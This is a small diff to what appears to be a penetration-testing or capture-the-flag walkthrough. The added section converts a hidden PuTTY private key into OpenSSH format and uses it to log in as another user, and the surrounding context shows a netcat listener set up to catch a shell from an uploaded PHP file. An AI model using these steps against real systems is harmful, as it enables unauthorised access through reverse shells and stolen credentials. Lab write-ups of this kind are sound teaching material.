@@ -34,6 +34,12 @@ nc -lvnp <Match the port in the php file>
 <Victim IP>:5000/uploads/<filename.php>
 ```
 
+## Horizontal Escalation Vector 1
+
+puttygen /tmp/.sys_cache/.thumb -O private-openssh -o /tmp/converted_id
+/tmp/.sys_cache$ chmod 600 /tmp/converted_id
+/tmp/.sys_cache$ ssh -i /tmp/converted_id alice@localhost
+
 
 ## Vertical Escalation Vector 1
 
